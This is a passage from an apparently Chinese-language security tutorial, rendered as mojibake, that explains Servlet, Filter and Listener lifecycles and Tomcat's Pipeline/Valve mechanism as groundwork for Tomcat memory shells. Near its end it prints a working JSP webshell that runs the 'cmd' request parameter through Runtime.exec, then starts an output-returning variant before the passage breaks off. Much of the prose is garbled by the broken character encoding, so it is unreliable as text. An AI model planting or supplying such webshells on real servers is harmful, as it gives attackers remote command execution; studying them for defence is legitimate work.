<p><font style="color:rgb(31, 35, 40);">ä¸šåŠ¡é€»è¾‘å¤„ç†å®Œæˆä¹‹åï¼Œè¿”å›ç»™Servletå®¹å™¨ï¼Œç„¶åå®¹å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">å®¹å™¨å…³é—­æ—¶å€™ï¼Œä¼šè°ƒç”¨destoryæ–¹æ³•</font></p>
<h4 id="3-2-3-servletç”Ÿå‘½å‘¨æœŸ"><a href="#3-2-3-servletç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3.2.3 servletç”Ÿå‘½å‘¨æœŸ"></a><font style="color:rgb(31, 35, 40);">3.2.3 servletç”Ÿå‘½å‘¨æœŸ</font></h4><p><font style="color:rgb(31, 35, 40);">1ï¼‰æœåŠ¡å™¨å¯åŠ¨æ—¶(web.xmlä¸­é…ç½®load-on-startup&#x3D;1ï¼Œé»˜è®¤ä¸º0)æˆ–è€…ç¬¬ä¸€æ¬¡è¯·æ±‚è¯¥servletæ—¶ï¼Œå°±ä¼šåˆå§‹åŒ–ä¸€ä¸ªServletå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œåˆå§‹åŒ–æ–¹æ³•init(ServletConfig conf)ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">2ï¼‰servletå¯¹è±¡å»å¤„ç†æ‰€æœ‰å®¢æˆ·ç«¯è¯·æ±‚ï¼Œåœ¨service(ServletRequest reqï¼ŒServletResponse res)æ–¹æ³•ä¸­æ‰§è¡Œ</font></p>
<p><font style="color:rgb(31, 35, 40);">3ï¼‰æœåŠ¡å™¨å…³é—­æ—¶ï¼Œé”€æ¯è¿™ä¸ªservletå¯¹è±¡ï¼Œæ‰§è¡Œdestroy()æ–¹æ³•ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">4ï¼‰ç”±JVMè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508795.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="3-3-Filter"><a href="#3-3-Filter" class="headerlink" title="3.3 Filter"></a>3.3 Filter</h3><h4 id="3-3-1-ç®€ä»‹"><a href="#3-3-1-ç®€ä»‹" class="headerlink" title="3.3.1 ç®€ä»‹"></a><font style="color:rgb(31, 35, 40);">3.3.1 ç®€ä»‹</font></h4><p><font style="color:rgb(31, 35, 40);">filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œæ˜¯å¯¹ServletæŠ€æœ¯çš„ä¸€ä¸ªå¼ºè¡¥å……ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯åœ¨HttpServletRequeståˆ°è¾¾ Servlet ä¹‹å‰ï¼Œæ‹¦æˆªå®¢æˆ·çš„HttpServletRequest ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletRequestï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletRequest å¤´å’Œæ•°æ®ï¼›åœ¨HttpServletResponseåˆ°è¾¾å®¢æˆ·ç«¯ä¹‹å‰ï¼Œæ‹¦æˆªHttpServletResponse ï¼Œæ ¹æ®éœ€è¦æ£€æŸ¥HttpServletResponseï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹HttpServletResponseå¤´å’Œæ•°æ®ã€‚</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508866.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-3-2-åŸºæœ¬å·¥ä½œåŸç†"><a href="#3-3-2-åŸºæœ¬å·¥ä½œåŸç†" class="headerlink" title="3.3.2 åŸºæœ¬å·¥ä½œåŸç†"></a><font style="color:rgb(31, 35, 40);">3.3.2 åŸºæœ¬å·¥ä½œåŸç†</font></h4><p><font style="color:rgb(31, 35, 40);">1ã€Filter ç¨‹åºæ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹æ®Šæ¥å£çš„ Java ç±»ï¼Œä¸ Servlet ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”± Servlet å®¹å™¨è¿›è¡Œè°ƒç”¨å’Œæ‰§è¡Œçš„ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">2ã€å½“åœ¨ web.xml æ³¨å†Œäº†ä¸€ä¸ª Filter æ¥å¯¹æŸä¸ª Servlet ç¨‹åºè¿›è¡Œæ‹¦æˆªå¤„ç†æ—¶ï¼Œå®ƒå¯ä»¥å†³å®šæ˜¯å¦å°†è¯·æ±‚ç»§ç»­ä¼ é€’ç»™ Servlet ç¨‹åºï¼Œä»¥åŠå¯¹è¯·æ±‚å’Œå“åº”æ¶ˆæ¯æ˜¯å¦è¿›è¡Œä¿®æ”¹ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">3ã€å½“ Servlet å®¹å™¨å¼€å§‹è°ƒç”¨æŸä¸ª Servlet ç¨‹åºæ—¶ï¼Œå¦‚æœå‘ç°å·²ç»æ³¨å†Œäº†ä¸€ä¸ª Filter ç¨‹åºæ¥å¯¹è¯¥ Servlet è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå®¹å™¨ä¸å†ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ Filter çš„ doFilter æ–¹æ³•ï¼Œå†ç”± doFilter æ–¹æ³•å†³å®šæ˜¯å¦å»æ¿€æ´» service æ–¹æ³•ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">4ã€ä½†åœ¨ Filter.doFilter æ–¹æ³•ä¸­ä¸èƒ½ç›´æ¥è°ƒç”¨ Servlet çš„ service æ–¹æ³•ï¼Œè€Œæ˜¯è°ƒç”¨ FilterChain.doFilter æ–¹æ³•æ¥æ¿€æ´»ç›®æ ‡ Servlet çš„ service æ–¹æ³•ï¼ŒFilterChain å¯¹è±¡æ—¶é€šè¿‡ Filter.doFilter æ–¹æ³•çš„å‚æ•°ä¼ é€’è¿›æ¥çš„ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">5ã€åªè¦åœ¨ Filter.doFilter æ–¹æ³•ä¸­è°ƒç”¨ FilterChain.doFilter æ–¹æ³•çš„è¯­å¥å‰åå¢åŠ æŸäº›ç¨‹åºä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Servlet è¿›è¡Œå“åº”å‰åå®ç°æŸäº›ç‰¹æ®ŠåŠŸèƒ½ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);">6ã€å¦‚æœåœ¨ Filter.doFilter æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ FilterChain.doFilter æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ Servlet çš„ service æ–¹æ³•ä¸ä¼šè¢«æ‰§è¡Œï¼Œè¿™æ ·é€šè¿‡ Filter å°±å¯ä»¥é˜»æ­¢æŸäº›éæ³•çš„è®¿é—®è¯·æ±‚ã€‚</font></p>
<h4 id="3-3-3-filterçš„ç”Ÿå‘½å‘¨æœŸ"><a href="#3-3-3-filterçš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="3.3.3 filterçš„ç”Ÿå‘½å‘¨æœŸ"></a><font style="color:rgb(31, 35, 40);">3.3.3 filterçš„ç”Ÿå‘½å‘¨æœŸ</font></h4><p><font style="color:rgb(31, 35, 40);">ä¸servletä¸€æ ·ï¼ŒFilterçš„åˆ›å»ºå’Œé”€æ¯ä¹Ÿç”±webå®¹å™¨è´Ÿè´£ã€‚web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œweb æœåŠ¡å™¨å°†åˆ›å»ºFilter çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶initæ–¹æ³•ï¼Œè¯»å–web.xmlé…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œï¼ˆfilterå¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinitæ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚å¼€å‘äººå‘˜é€šè¿‡initæ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰filteré…ç½®ä¿¡æ¯çš„FilterConfigå¯¹è±¡ã€‚ Filterå¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“webåº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ã€‚åœ¨Webå®¹å™¨å¸è½½ Filter å¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ã€‚è¯¥æ–¹æ³•åœ¨Filterçš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æºã€‚</font></p>
<h4 id="3-3-4-filteré“¾"><a href="#3-3-4-filteré“¾" class="headerlink" title="3.3.4 filteré“¾ "></a><font style="color:rgb(31, 35, 40);">3.3.4 filteré“¾ </font></h4><p><font style="color:rgb(31, 35, 40);">å½“å¤šä¸ªfilteråŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº†filteré“¾ã€‚webæœåŠ¡å™¨æ ¹æ®Filteråœ¨web.xmlæ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ªFilterã€‚å½“ç¬¬ä¸€ä¸ªFilterçš„doFilteræ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨Filteré“¾çš„FilterChainå¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œé€šè¿‡åˆ¤æ–­FilterChainä¸­æ˜¯å¦è¿˜æœ‰filterå†³å®šåé¢æ˜¯å¦è¿˜è°ƒç”¨filterã€‚</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508459.png" srcset="/img/loading.gif" lazyload></p>
<p><font style="color:rgb(31, 35, 40);"></font></p>
<h3 id="3-4-Listener"><a href="#3-4-Listener" class="headerlink" title="3.4 Listener"></a><strong><font style="color:rgb(31, 35, 40);">3.4 Listener</font></strong></h3><h4 id="3-4-1-ç®€ä»‹"><a href="#3-4-1-ç®€ä»‹" class="headerlink" title="3.4.1 ç®€ä»‹"></a><font style="color:rgb(31, 35, 40);">3.4.1 ç®€ä»‹</font></h4><p><font style="color:rgb(31, 35, 40);">JavaWebå¼€å‘ä¸­çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰å°±æ˜¯Applicationã€Sessionå’ŒRequestä¸‰å¤§å¯¹è±¡åˆ›å»ºã€é”€æ¯æˆ–è€…å¾€å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ã€‚</font></p>
<p><strong><font style="color:rgb(31, 35, 40);">ServletContextListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› </font></p>
<p><strong><font style="color:rgb(31, 35, 40);">ServletContextAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šç›‘å¬Servletä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ï¼›</font></p>
<p><strong><font style="color:rgb(31, 35, 40);">HttpSessionListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹Sessionçš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚Sessionçš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ä¸ªä¸­Sessionè¶…æ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡è°ƒç”¨Sessionå¯¹è±¡çš„invalidate()æ–¹æ³•ä½¿sessionå¤±æ•ˆã€‚</font></p>
<p><strong><font style="color:rgb(31, 35, 40);">HttpSessionAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ï¼›</font></p>
<p><strong><font style="color:rgb(31, 35, 40);">ServletRequestListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ï¼› </font></p>
<p><strong><font style="color:rgb(31, 35, 40);">ServletRequestAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">ï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚</font></p>
<p><font style="color:rgb(31, 35, 40);"></font></p>
<p><font style="color:rgb(0, 0, 0);">åœ¨åº”ç”¨ä¸­å¯èƒ½è°ƒç”¨çš„ç›‘å¬å™¨å¦‚ä¸‹ï¼š</font></p>
<ul>
<li><font style="color:rgb(0, 0, 0);">ServletContextListenerï¼šç”¨äºç›‘å¬æ•´ä¸ª Servlet ä¸Šä¸‹æ–‡ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰</font></li>
<li><font style="color:rgb(0, 0, 0);">ServletContextAttributeListenerï¼šå¯¹ Servlet ä¸Šä¸‹æ–‡å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰</font></li>
<li><font style="color:rgb(0, 0, 0);">ServletRequestListenerï¼šå¯¹ Request è¯·æ±‚è¿›è¡Œç›‘å¬ï¼ˆåˆ›å»ºã€é”€æ¯ï¼‰</font></li>
<li><font style="color:rgb(0, 0, 0);">ServletRequestAttributeListenerï¼šå¯¹ Request å±æ€§è¿›è¡Œç›‘å¬ï¼ˆå¢åˆ æ”¹å±æ€§ï¼‰</font></li>
<li><font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionListenerï¼šå¯¹ Session æ•´ä½“çŠ¶æ€çš„ç›‘å¬</font></li>
<li><font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionAttributeListenerï¼šå¯¹ Session å±æ€§çš„ç›‘å¬</font></li>
</ul>
<h4 id="3-4-2-ç”¨é€”"><a href="#3-4-2-ç”¨é€”" class="headerlink" title="3.4.2 ç”¨é€”"></a><font style="color:rgb(31, 35, 40);">3.4.2 ç”¨é€”</font></h4><p><font style="color:rgb(31, 35, 40);">å¯ä»¥ä½¿ç”¨ç›‘å¬å™¨ç›‘å¬å®¢æˆ·ç«¯çš„è¯·æ±‚ã€æœåŠ¡ç«¯çš„æ“ä½œç­‰ã€‚é€šè¿‡ç›‘å¬å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å‡ºå‘ä¸€äº›åŠ¨ä½œï¼Œæ¯”å¦‚ç›‘å¬åœ¨çº¿çš„ç”¨æˆ·æ•°é‡ï¼Œç»Ÿè®¡ç½‘ç«™è®¿é—®é‡ã€ç½‘ç«™è®¿é—®ç›‘æ§ç­‰ã€‚</font></p>
<h3 id="3-5-Tomcatå†…å­˜é©¬"><a href="#3-5-Tomcatå†…å­˜é©¬" class="headerlink" title="3.5 Tomcatå†…å­˜é©¬"></a>3.5 Tomcatå†…å­˜é©¬</h3><p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹ã€‚Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p>
<p>è€Œè¿™ä¸€æŠ€æœ¯çš„å®ç°æœ‰èµ–äºå®˜æ–¹å¯¹Servlet3.0çš„å‡çº§ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œå› æ­¤é€šè¿‡åŠ¨æ€æ·»åŠ æ¶æ„ç»„ä»¶æ³¨å…¥å†…å­˜é©¬çš„æ–¹å¼é€‚åˆTomcat7.xåŠä»¥ä¸Šã€‚ä¸ºäº†ä¾¿äºè°ƒè¯•Tomcatï¼Œæˆ‘ä»¬å…ˆåœ¨çˆ¶é¡¹ç›®çš„pomæ–‡ä»¶ä¸­å¼•å…¥Tomcatä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>



<h3 id="3-6-Tomcat-çš„ç®¡é“æœºåˆ¶"><a href="#3-6-Tomcat-çš„ç®¡é“æœºåˆ¶" class="headerlink" title="3.6 Tomcat çš„ç®¡é“æœºåˆ¶"></a>3.6 Tomcat çš„ç®¡é“æœºåˆ¶</h3><h4 id="3-6-1-Tomcatä¸­çš„ç®¡é“æœºåˆ¶"><a href="#3-6-1-Tomcatä¸­çš„ç®¡é“æœºåˆ¶" class="headerlink" title="3.6.1 Tomcatä¸­çš„ç®¡é“æœºåˆ¶"></a>3.6.1 Tomcatä¸­çš„<code>ç®¡é“æœºåˆ¶</code></h4><blockquote>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“Tomcatæ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šä½¿ç”¨<code>Connector</code>è¿›è¡Œè§£æï¼Œç„¶åå‘é€åˆ°<code>Container</code>è¿›è¡Œå¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¶ˆæ¯åˆæ˜¯æ€ä¹ˆåœ¨å››ç±»å­å®¹å™¨ä¸­å±‚å±‚ä¼ é€’ï¼Œæœ€ç»ˆé€åˆ°Servletè¿›è¡Œå¤„ç†çš„å‘¢ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°çš„æœºåˆ¶å°±æ˜¯Tomcatç®¡é“æœºåˆ¶ã€‚</p>
<p>ç®¡é“æœºåˆ¶ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªåè¯ï¼ŒPipelineï¼ˆç®¡é“ï¼‰å’ŒValveï¼ˆé˜€é—¨ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚æ¯”ä½œç®¡é“ï¼ˆPipelineï¼‰ä¸­æµåŠ¨çš„æ°´ï¼Œé‚£ä¹ˆé˜€é—¨ï¼ˆValveï¼‰å°±å¯ä»¥ç”¨æ¥åœ¨ç®¡é“ä¸­å®ç°å„ç§åŠŸèƒ½ï¼Œå¦‚æ§åˆ¶æµé€Ÿç­‰ã€‚å› æ­¤é€šè¿‡ç®¡é“æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½æŒ‰ç…§éœ€æ±‚ï¼Œç»™åœ¨ä¸åŒå­å®¹å™¨ä¸­æµé€šçš„è¯·æ±‚æ·»åŠ å„ç§ä¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶æå‰åœ¨ä¸åŒå­å®¹å™¨ä¸­å®Œæˆç›¸åº”çš„é€»è¾‘æ“ä½œã€‚è¿™é‡Œçš„è°ƒç”¨æµç¨‹å¯ä»¥ç±»æ¯”ä¸ºFilterä¸­çš„è´£ä»»é“¾æœºåˆ¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508670.png" srcset="/img/loading.gif" lazyload></p>
<p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ªStandardPipelineå®ä¾‹ã€‚</p>
</blockquote>
<h4 id="3-6-2-ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ"><a href="#3-6-2-ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ" class="headerlink" title="3.6.2 ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ"></a>3.6.2 ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹Pipelineæ¥å£ï¼Œå…¶ç»§æ‰¿äº†Containedæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†å¾ˆå¤šå¯¹ Valve çš„æ“ä½œæ–¹æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509796.png" srcset="/img/loading.gif" lazyload></p>
<p>è·Ÿè¿›æŸ¥çœ‹ Valve æ¥å£ï¼š</p>
<p>å…¶ä¸­getNext()æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªValveï¼ŒValveçš„è°ƒç”¨è¿‡ç¨‹å¯ä»¥ç†è§£æˆç±»ä¼¼Filterä¸­çš„è´£ä»»é“¾æ¨¡å¼ï¼ŒæŒ‰é¡ºåºè°ƒç”¨ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508325.jpeg" srcset="/img/loading.gif" lazyload></p>
<p>åŒæ—¶Valveå¯ä»¥é€šè¿‡é‡å†™<code>invoke()</code>æ–¹æ³•æ¥å®ç°å…·ä½“çš„ä¸šåŠ¡é€»è¾‘</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509163.png" srcset="/img/loading.gif" lazyload></p>
<p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡æºç çœ‹ä¸€çœ‹ï¼Œæ¶ˆæ¯åœ¨å®¹å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ é€’çš„ã€‚é¦–å…ˆæ¶ˆæ¯ä¼ é€’åˆ°Connectorè¢«è§£æåï¼Œåœ¨<code>org.apache.catalina.connector.CoyoteAdapter#service</code>æ–¹æ³•ä¸­  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508440.png" srcset="/img/loading.gif" lazyload></p>
<p>å‰é¢æ˜¯å¯¹Requestå’ŒResponeå¯¹è±¡è¿›è¡Œä¸€äº›åˆ¤æ–­åŠåˆ›å»ºæ“ä½œï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹</p>
<p><code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p>
<p>é¦–å…ˆé€šè¿‡<code>connector.getService()</code>æ¥è·å–ä¸€ä¸ªStandardServiceå¯¹è±¡</p>
<p>æ¥ç€é€šè¿‡<code>StandardService</code>.<code>getContainer().getPipeline()</code>è·å–<code>StandardPipeline</code>å¯¹è±¡ã€‚</p>
<p>å†é€šè¿‡<code>StandardPipeline.getFirst()</code>è·å–ç¬¬ä¸€ä¸ªValve</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508076.png" srcset="/img/loading.gif" lazyload></p>
<p> æœ€åé€šè¿‡è°ƒç”¨<code>StandardEngineValve.invoke()</code>æ¥å®ç°Valveçš„å„ç§ä¸šåŠ¡é€»è¾‘  </p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509410.png" srcset="/img/loading.gif" lazyload></p>
<p><code>host.getPipeline().getFirst().invoke(request, response)</code>å®ç°è°ƒç”¨åç»­çš„Valveã€‚  </p>
<h2 id="4-JSP"><a href="#4-JSP" class="headerlink" title="4. JSP"></a>4. JSP</h2><h3 id="4-1-ä»€ä¹ˆæ˜¯-JSPï¼š"><a href="#4-1-ä»€ä¹ˆæ˜¯-JSPï¼š" class="headerlink" title="4.1 ä»€ä¹ˆæ˜¯ JSPï¼š"></a>4.1 ä»€ä¹ˆæ˜¯ JSPï¼š</h3><p>JSPï¼ˆJava Server Pagesï¼‰ï¼Œæ˜¯Javaçš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯ã€‚åœ¨æ—©æœŸJavaçš„å¼€å‘æŠ€æœ¯ä¸­ï¼ŒJavaç¨‹åºå‘˜å¦‚æœæƒ³è¦å‘æµè§ˆå™¨è¾“å‡ºä¸€äº›æ•°æ®ï¼Œå°±å¿…é¡»å¾—æ‰‹åŠ¨<code>println</code>ä¸€è¡Œè¡Œçš„HTMLä»£ç ã€‚ä¸ºäº†è§£å†³è¿™ä¸€ç¹ççš„é—®é¢˜ï¼ŒJavaå¼€å‘äº†JSPæŠ€æœ¯ã€‚</p>
<p>JSPå¯ä»¥çœ‹ä½œä¸€ä¸ªJava Servletï¼Œä¸»è¦ç”¨äºå®ç°Java webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢éƒ¨åˆ†ã€‚ç½‘é¡µå¼€å‘è€…ä»¬é€šè¿‡ç»“åˆHTMLä»£ç ã€XHTMLä»£ç ã€XMLå…ƒç´ ä»¥åŠåµŒå…¥JSPæ“ä½œå’Œå‘½ä»¤æ¥ç¼–å†™JSPã€‚</p>
<p>å½“ç¬¬ä¸€æ¬¡è®¿é—®JSPé¡µé¢æ—¶ï¼ŒTomcatæœåŠ¡å™¨ä¼šå°†JSPé¡µé¢ç¿»è¯‘æˆä¸€ä¸ªjavaæ–‡ä»¶ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸º.classæ–‡ä»¶ã€‚JSPé€šè¿‡ç½‘é¡µè¡¨å•è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ã€è®¿é—®æ•°æ®åº“åŠå…¶ä»–æ•°æ®æºï¼Œç„¶ååŠ¨æ€åœ°åˆ›å»ºç½‘é¡µã€‚</p>
<h3 id="4-2-æ¶æ„ç±»ï¼š"><a href="#4-2-æ¶æ„ç±»ï¼š" class="headerlink" title="4.2 æ¶æ„ç±»ï¼š"></a>4.2 æ¶æ„ç±»ï¼š</h3><h4 id="JSP-çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š"><a href="#JSP-çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š" class="headerlink" title="JSP çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š"></a><font style="color:rgb(80, 80, 92);">JSP çš„æ— å›æ˜¾çš„å†…å­˜é©¬ï¼š</font></h4><p>æœ€ç®€å•çš„ JSP å‘½ä»¤æ‰§è¡Œåé—¨ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµï¼ˆInputStreamï¼‰æœªè¢«è¯»å–æˆ–å†™å› HTTP å“åº”æ‰€ä»¥æ— å›æ˜¾ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));%&gt;<br></code></pre></td></tr></table></figure>

<p>æ”¹è¿›ä¸ºå¸¦å›æ˜¾ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br><span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> 